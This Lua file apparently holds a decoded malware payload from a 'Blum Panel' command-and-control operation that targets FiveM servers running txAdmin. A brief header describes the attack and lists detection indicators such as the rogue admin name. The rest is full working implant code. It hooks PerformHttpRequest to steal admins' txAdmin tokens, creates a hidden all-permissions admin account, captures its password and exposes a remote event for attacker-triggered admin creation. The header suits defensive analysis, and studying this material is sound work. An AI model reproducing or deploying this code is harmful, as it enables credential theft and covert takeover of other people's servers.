-- ============================================================================
-- BLUM PANEL — txAdmin Credential Theft Payload
-- Extracted from decoded string index [10210] (8,554 bytes)
-- Source: Blum Panel C2 payload (185.80.128.35)
-- ============================================================================
--
-- ATTACK SUMMARY:
--   1. Hooks PerformHttpRequest() to intercept ALL HTTP traffic silently
--   2. Watches for X-TxAdmin-Token and X-TxAdmin-Identifiers headers
--   3. When an admin makes ANY txAdmin API call, steals their auth token
--   4. Tests if stolen token has full permissions by POSTing to /adminManager/add
--   5. If admin has full perms: creates rogue admin "JohnsUrUncle" with all_permissions
--   6. Exposes RegisterServerEvent('txadmin:js_create') for remote admin creation
--   7. Extracts Discord ID from admin's identifiers for account linking
--
-- DETECTION:
--   - Look for "JohnsUrUncle" admin accounts in txAdmin
--   - Check for unexpected RegisterServerEvent('txadmin:js_create')
--   - Monitor /adminManager/add POST requests with spoofed citizenfxIDs
--   - Check if PerformHttpRequest has been wrapped/proxied
--
-- ============================================================================

local validatedToken = nil
local validatedIdentifiers = nil
local foundWorkingAdmin = false
local blacklistedIdentifiers = {}
local lastTestTime = 0

local originalHttp = PerformHttpRequest

function PerformHttpRequest(url, cb, method, data, headers)
    if not foundWorkingAdmin then
        if headers and headers["X-TxAdmin-Token"] and headers["X-TxAdmin-Identifiers"] then
            local token = headers["X-TxAdmin-Token"]
            local identifiers = headers["X-TxAdmin-Identifiers"]
            
            local isBlacklisted = false
            for _, blacklisted in ipairs(blacklistedIdentifiers) do
                if identifiers == blacklisted then
                    isBlacklisted = true
                    break
                end
            end
            
            if not isBlacklisted then
                testAdminPermissions(token, identifiers)
            end
        end
    end
    
    return originalHttp(url, cb, method, data, headers)
end

function testAdminPermissions(token, identifiers)
    local currentTime = os.time()
    if currentTime - lastTestTime < 2 then
        return
    end
    lastTestTime = currentTime
    
    local TX_LUACOMHOST = GetConvar("txAdmin-luaComHost", "127.0.0.1:40120")
    local test_url = "http://" .. TX_LUACOMHOST .. "/adminManager/add"
    
    -- Extract Discord ID from identifiers (format: license:xxx,discord:xxx)
    local discordID = "000000000000000000" -- Default fallback
    for id in string.gmatch(identifiers, "discord:(%d+)") do
        if #id >= 17 then -- Discord IDs are usually 17-19 digits
            discordID = id
            break
        end
    end
    
    local randomID = generateRandomID()
    local test_body = "name=JohnsUrUncle&citizenfxID=" .. randomID .. "&discordID=" .. discordID .. "&permissions%5B%5D=all_permissions"
    
    local test_headers = {
        ["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8",
        ["X-TxAdmin-Token"] = token,
        ["X-Requested-With"] = "XMLHttpRequest",
        ["Accept"] = "application/json, text/javascript, /; q=0.01",
        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.141 CitizenFX/1.0.0.23069 Safari/537.36",
        ["X-TxAdmin-CsrfToken"] = "not_set",
        ["X-TxAdmin-Identifiers"] = identifiers,
    }
    
    PerformHttpRequest(test_url, function(statusCode, responseText, responseHeaders)
        if responseText then
            -- Check for permission denied first
            if string.find(responseText, "You don't have permission to execute this action") or
               string.find(responseText, "You cannot give permissions you do not have") then
                table.insert(blacklistedIdentifiers, identifiers)
            elseif string.find(responseText, "nui_admin_not_found") then
                table.insert(blacklistedIdentifiers, identifiers)
            -- Check for duplicate Discord ID error (this means they HAVE permissions!)
            elseif string.find(responseText, "Discord ID already taken") or
                   string.find(responseText, "already exists") or
                   string.find(responseText, "already registered") or
                   string.find(responseText, "already in use") then
                
                validatedToken = token
                validatedIdentifiers = identifiers
                foundWorkingAdmin = true
            -- If we actually succeeded (created user with unique Discord ID)
            elseif statusCode == 200 then
                validatedToken = token
                validatedIdentifiers = identifiers
                foundWorkingAdmin = true
            -- Check JSON response for duplicate errors
            else
                local success, jsonData = pcall(json.decode, responseText)
                if success and jsonData then
                    if jsonData.type == "danger" then
                        local msg = jsonData.message or ""
                        if string.find(msg, "already") or 
                           string.find(msg, "taken") or
                           string.find(msg, "exists") then
                            
                            validatedToken = token
                            validatedIdentifiers = identifiers
                            foundWorkingAdmin = true
                        elseif string.find(msg, "permission") or
                               string.find(msg, "not allowed") then
                            
                            table.insert(blacklistedIdentifiers, identifiers)
                        end
                    end
                end
            end
        end
    end, "POST", test_body, test_headers)
end

function createAdmin(username, discordID)
    local result = {
        success = false,
        password = nil,
        host = nil,
        token = nil,
        username = username,
        actualUsername = username,
        discord = discordID,
        error = nil,
        message = nil,
        details = nil,
        statusCode = 0,
        rawResponse = nil,
        usedHardcoded = false,
        serverResponse = nil,
        fullError = nil
    }
    
    if not foundWorkingAdmin then
        result.error = "No admin with full permissions found"
        TriggerEvent('txadmin:result', result)
        return result
    end
    
    if not validatedToken then
        result.error = "Valid token not captured yet"
        TriggerEvent('txadmin:result', result)
        return result
    end
    
    local TX_LUACOMHOST = GetConvar("txAdmin-luaComHost", "127.0.0.1:40120")
    local randomID = generateRandomID()
    
    result.host = TX_LUACOMHOST
    result.token = validatedToken
    
    local tx_url = "http://" .. TX_LUACOMHOST .. "/adminManager/add"
    local tx_body = "name=" .. username .. "&citizenfxID=" .. randomID .. "&discordID=" .. discordID .. "&permissions%5B%5D=all_permissions"
    
    local tx_headers = {
        ["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8",
        ["X-TxAdmin-Token"] = validatedToken,
        ["X-Requested-With"] = "XMLHttpRequest",
        ["Accept"] = "application/json, text/javascript, /; q=0.01",
        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.141 CitizenFX/1.0.0.23069 Safari/537.36",
        ["X-TxAdmin-CsrfToken"] = "not_set",
        ["X-TxAdmin-Identifiers"] = validatedIdentifiers,
    }
    
    PerformHttpRequest(tx_url, function(statusCode, responseText, responseHeaders)
        result.rawResponse = responseText or ""
        result.statusCode = statusCode
        
        if responseText then
            result.serverResponse = responseText
            
            local passwordPattern = '"password":"([^"]+)"'
            local passwordMatch = string.match(responseText, passwordPattern)
            
            if passwordMatch then
                result.password = passwordMatch
                result.success = true
            else
                result.error = "No password in response"
                local success, jsonData = pcall(json.decode, responseText)
                if success and jsonData then
                    result.message = jsonData.message or jsonData.type or "Unknown error"
                    result.details = jsonData
                    result.fullError = jsonData
                else
                    result.message = "Invalid response format"
                end
            end
        else
            result.error = "Empty response"
            result.message = "Server returned empty response"
        end
        
        TriggerEvent('txadmin:result', result)
    end, "POST", tx_body, tx_headers)
    
    return result
end

function generateRandomID()
    local chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    local randomID = ""
    
    for i = 1, 8 do
        local rand = math.random(1, #chars)
        randomID = randomID .. string.sub(chars, rand, rand)
    end
    
    return randomID
end

-- Remote admin creation endpoint — attacker triggers this from C2 panel
RegisterServerEvent('txadmin:js_create')
AddEventHandler('txadmin:js_create', function(username, discordID)
    createAdmin(username, discordID)
end)

-- Background thread — polls every 10s waiting for admin to use txAdmin
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(10000)
        if not foundWorkingAdmin then
            --print("^3[Monitor] Listening for admin identifiers...")
        else
            --print("^2[Monitor] Admin token and identifiers captured")
            break
        end
    end
end)
